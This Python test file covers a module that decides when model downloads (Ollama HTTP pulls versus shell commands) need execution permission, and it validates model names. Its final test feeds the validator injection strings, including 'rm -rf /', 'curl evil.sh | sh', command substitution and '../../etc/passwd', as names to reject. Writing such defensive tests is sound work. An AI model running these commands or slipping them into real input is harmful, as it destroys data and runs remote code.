"""The line between fetching a file and executing a command.

One setting used to govern both, defaulting to off, and the result was visible
in the product: through Ollama you could install nothing at all, while through
llama.cpp you could paste any Hugging Face repository and pull gigabytes off the
open internet. The stricter path was the safer-looking one, not the safer one.

These tests exist because the distinction is easy to erase while tidying. Two
branches that look like they do the same thing invite being unified, and the
unification tends to go toward whichever is easier to reach.
"""

from app.core.domain.model_download_boundary import (
    HTTP_DAEMON,
    SHELL_COMMAND,
    is_valid_ollama_model_name,
    may_download,
)


def test_an_http_pull_needs_no_execution_permission():
    """It sends a name to a daemon and reads bytes back. That is the same class
    of act as downloading a model file, which has never needed a flag."""
    permission = may_download(HTTP_DAEMON, execution_enabled=False, model_is_known=False)

    assert permission.allowed
    assert "no shell command is run" in permission.reason.lower()


def test_an_http_pull_does_not_care_which_model_it_is():
    """Refusing `llama3.3` because it is not in our catalog is exactly the
    restriction this module exists to lift."""
    assert may_download(HTTP_DAEMON, model_is_known=False).allowed


def test_a_shell_command_still_needs_the_setting():
    permission = may_download(SHELL_COMMAND, execution_enabled=False, model_is_known=True)

    assert not permission.allowed
    # And the refusal points at the path that does work, rather than dead-ending.
    assert "daemon" in permission.reason


def test_a_shell_command_still_needs_a_known_model():
    permission = may_download(SHELL_COMMAND, execution_enabled=True, model_is_known=False)

    assert not permission.allowed
    assert "already knows about" in permission.reason


def test_a_shell_command_with_both_protections_satisfied_proceeds():
    assert may_download(SHELL_COMMAND, execution_enabled=True, model_is_known=True).allowed


def test_the_two_methods_are_not_governed_by_one_switch():
    """The regression this file is really guarding: turning execution off must
    not turn Ollama downloads off, because it did, and that was the bug."""
    execution_off = {"execution_enabled": False, "model_is_known": True}

    assert may_download(HTTP_DAEMON, **execution_off).allowed
    assert not may_download(SHELL_COMMAND, **execution_off).allowed


def test_an_unknown_method_is_refused_rather_than_assumed_safe():
    assert not may_download("carrier_pigeon").allowed


# --- the model name is data, but it still travels ------------------------------


def test_ordinary_model_tags_are_accepted():
    for name in ("llama3.3", "qwen3:8b", "nomic-embed-text", "hf.co/user/repo:Q4_K_M"):
        assert is_valid_ollama_model_name(name), name


def test_shapes_that_cannot_be_a_model_name_are_refused():
    for name in (
        "",
        "   ",
        "llama3 && rm -rf /",
        "model; curl evil.sh | sh",
        "../../etc/passwd",
        "http://elsewhere/model",
        "model$(whoami)",
        "model`id`",
        "a" * 500,
    ):
        assert not is_valid_ollama_model_name(name), name
